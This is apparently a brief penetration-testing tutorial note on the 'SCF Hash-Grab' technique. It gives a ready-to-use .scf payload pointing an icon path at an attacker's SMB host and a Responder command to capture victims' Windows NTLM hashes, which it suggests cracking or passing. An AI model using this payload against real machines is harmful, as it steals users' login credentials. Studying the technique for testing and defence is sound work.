#vulnerability

# SCF Hash-Grab
## What is SCF Hash-Grab?
SCF Hash-Grab is a way to grab a victim's hash just by dropping a file in the disk.

"Just by accessing a folder containing a malicious SCF file, a user will unwittingly share his computer's login credentials with an attacker via Google Chrome and the SMB protocol," says BleepingComputer

It leverages a Shell Command File (SCF) in Windows - A file that configures a folder, including fetching resources, like Icon files, from SMB servers, which can give you...

## What does SCF Hash-Grab give me?
This technique gives you the NTLM hash of the user, so you can break/pass it and use other Windows services.

## Any documentation on SCF Hash-Grab?
[BleepingComputer - You Can Steal Windows Login Creds via Chrome and SCF](https://www.bleepingcomputer.com/news/security/you-can-steal-windows-login-credentials-via-google-chrome-and-scf-files/)
[Stealing Windows Credentials Using Google Chrome](https://www.defensecode.com/whitepapers/Stealing-Windows-Credentials-Using-Google-Chrome.pdf)

## How do I verify that a target is vulnerable?
Windows is vulnerable by default :)

The only requirements:
* File Upload
* Windows Explorer accesses the folder

## How do I use SCF Hash-Grab?
* Create a file named anything with a `.scf` extension
* write in it: 
```ini
[Shell]
IconFile=\\<your_ip>\icon
```
* turn on `responder` in your Kali setup
	* `sudo responder -I tun0`
* Wait for the user to check the folder
* Hash grabbed!